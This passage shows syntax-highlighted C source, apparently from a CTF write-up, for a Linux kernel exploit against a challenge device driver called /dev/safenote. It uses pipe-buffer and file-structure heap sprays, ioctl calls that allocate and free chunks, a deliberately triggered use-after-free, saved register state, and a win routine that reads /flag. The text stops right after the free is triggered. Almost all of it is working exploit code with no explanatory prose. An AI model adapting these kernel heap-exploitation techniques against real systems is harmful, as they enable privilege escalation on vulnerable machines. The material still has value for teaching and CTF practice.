+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(<span style="color:#d2a8ff;font-weight:bold">pipe</span>(pipe_fd[i]) <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span> data[<span style="color:#a5d6ff">0x1000</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">memset</span>(data, <span style="color:#a5d6ff">0x41</span>, <span style="color:#a5d6ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x10</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">long</span> <span style="color:#ff7b72;font-weight:bold">*</span>)(data <span style="color:#ff7b72;font-weight:bold">+</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x100</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x40</span>) <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x000f801f00008002</span>;
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> cnt; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> j <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; j <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x10</span>; j<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">write</span>(pipe_fd[i][<span style="color:#a5d6ff">1</span>], data, <span style="color:#a5d6ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> pipe_fd;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">free_pipes</span>(<span style="color:#ff7b72">int</span> <span style="color:#ff7b72;font-weight:bold">**</span>pipe_fd, <span style="color:#ff7b72">int</span> cnt) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> cnt; i <span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff;font-weight:bold">close</span>(pipe_fd[i][<span style="color:#a5d6ff">0</span>]) <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;close&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff;font-weight:bold">close</span>(pipe_fd[i][<span style="color:#a5d6ff">1</span>]) <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;close&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">free</span>(pipe_fd[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">free</span>(pipe_fd);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">create</span>(<span style="color:#ff7b72">int</span> fd, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">int</span> idx) { 
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> ret <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">ioctl</span>(fd, CREATE_CHUNK, (<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>)<span style="color:#ff7b72;font-weight:bold">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span>(ret <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;ioctl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">delete</span>(<span style="color:#ff7b72">int</span> fd, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">int</span> idx) { 
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> ret <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">ioctl</span>(fd, DELETE_CHUNK, (<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>)<span style="color:#ff7b72;font-weight:bold">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span>(ret <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;ioctl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">delete_nozero</span>(<span style="color:#ff7b72">int</span> fd, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">int</span> idx) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> ret <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">ioctl</span>(fd, DELETE_CHUNK_NOZERO, (<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>)<span style="color:#ff7b72;font-weight:bold">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span>(ret <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;ioctl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">scan_mem</span>(<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>mem, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">long</span> pattern, <span style="color:#ff7b72">int</span> sz) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> sz<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">7</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(<span style="color:#ff7b72;font-weight:bold">!</span><span style="color:#d2a8ff;font-weight:bold">memcmp</span>(mem, <span style="color:#ff7b72;font-weight:bold">&amp;</span>pattern, <span style="color:#a5d6ff">0x8</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">return</span> i;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        mem <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">print_arr</span>(<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>arr, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">int</span> n, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">int</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">unsigned</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> n; <span style="color:#ff7b72;font-weight:bold">++</span>i) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">switch</span>(size) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">1</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;%u: %hhx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, i, <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">uint8_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>)(arr <span style="color:#ff7b72;font-weight:bold">+</span> i));
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">2</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;%u: %hx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, i, <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">uint16_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>)(arr <span style="color:#ff7b72;font-weight:bold">+</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">2</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">4</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;%u: %x</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, i, <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">uint32_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>)(arr <span style="color:#ff7b72;font-weight:bold">+</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">4</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">case</span> <span style="color:#a5d6ff">8</span><span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;%u: %lx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, i, <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">uint64_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>)(arr <span style="color:#ff7b72;font-weight:bold">+</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#d2a8ff;font-weight:bold">spray_seq</span>(<span style="color:#ff7b72">int</span> cnt) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> <span style="color:#ff7b72;font-weight:bold">*</span>fds <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">calloc</span>(cnt, <span style="color:#ff7b72">sizeof</span>(<span style="color:#ff7b72">int</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> cnt; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        fds[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/proc/self/stat&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(fds[i] <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;open&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> fds;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">long</span> user_cs, user_ss, user_rsp, user_rflags;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">save_state</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">asm</span>(
+</span></span><span style="display:flex;"><span>      <span style="color:#a5d6ff">&#34;movq %%cs, %0</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a5d6ff">&#34;movq %%ss, %1</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a5d6ff">&#34;movq %%rsp, %2</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a5d6ff">&#34;pushfq</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a5d6ff">&#34;popq %3</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#34;=r&#34;</span>(user_cs), <span style="color:#a5d6ff">&#34;=r&#34;</span>(user_ss), <span style="color:#a5d6ff">&#34;=r&#34;</span>(user_rsp), <span style="color:#a5d6ff">&#34;=r&#34;</span>(user_rflags)
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#34;memory&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">win</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span> buf[<span style="color:#a5d6ff">0x100</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/flag&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] uid: %d</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#d2a8ff;font-weight:bold">getuid</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (fd <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;open&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;[-] lose...&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#ff7b72">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;[*] win!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">read</span>(fd, buf, <span style="color:#a5d6ff">0x100</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">write</span>(<span style="color:#a5d6ff">1</span>, buf, <span style="color:#a5d6ff">0x100</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&#34;[*] done&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">getchar</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span>(<span style="color:#ff7b72;font-weight:bold">!</span><span style="color:#d2a8ff;font-weight:bold">fork</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#ff7b72">const</span> args[] <span style="color:#ff7b72;font-weight:bold">=</span> {<span style="color:#a5d6ff">&#34;/bin/touch&#34;</span>, <span style="color:#a5d6ff">&#34;/tmp/x&#34;</span>};
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">execve</span>(<span style="color:#a5d6ff">&#34;/bin/touch&#34;</span>, args, NULL);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">save_state</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">bind_cpu</span>(<span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>page_spray[<span style="color:#a5d6ff">0x2000</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x2000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        page_spray[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">mmap</span>((<span style="color:#ff7b72">void</span><span style="color:#ff7b72;font-weight:bold">*</span>)(<span style="color:#a5d6ff">0xdead0000UL</span> <span style="color:#ff7b72;font-weight:bold">+</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x10000UL</span>),
+</span></span><span style="display:flex;"><span>                            <span style="color:#a5d6ff">0x8000</span>, PROT_READ<span style="color:#ff7b72;font-weight:bold">|</span>PROT_WRITE,
+</span></span><span style="display:flex;"><span>                            MAP_ANONYMOUS<span style="color:#ff7b72;font-weight:bold">|</span>MAP_SHARED, <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> (page_spray[i] <span style="color:#ff7b72;font-weight:bold">==</span> MAP_FAILED) <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;mmap&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/dev/safenote&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] device fd: %d</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> <span style="color:#ff7b72;font-weight:bold">**</span>pipes1 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">spray_pipes</span>(<span style="color:#a5d6ff">0x30</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> MAX_IDX; i <span style="color:#ff7b72;font-weight:bold">&gt;=</span> <span style="color:#a5d6ff">0</span>; i<span style="color:#ff7b72;font-weight:bold">--</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">create</span>(fd, i);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> <span style="color:#ff7b72;font-weight:bold">**</span>pipes2 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">spray_pipes</span>(<span style="color:#a5d6ff">0x30</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">free_pipes</span>(pipes2, <span style="color:#a5d6ff">0x30</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> loc <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xc0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> loc; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">delete</span>(fd, i);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">delete_nozero</span>(fd, loc);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> loc<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">1</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> MAX_IDX<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">1</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">delete</span>(fd, i);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">free_pipes</span>(pipes1, <span style="color:#a5d6ff">0x30</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> fds[<span style="color:#a5d6ff">0x1000</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        fds[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/tmp/x&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(fds[i] <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;open&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] before uaf trigger</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">delete</span>(fd, loc);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] triggered free</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> fds2[<span style="color:#a5d6ff">0x1000</span>];
+</span></span><span style="display:flex;"><span>
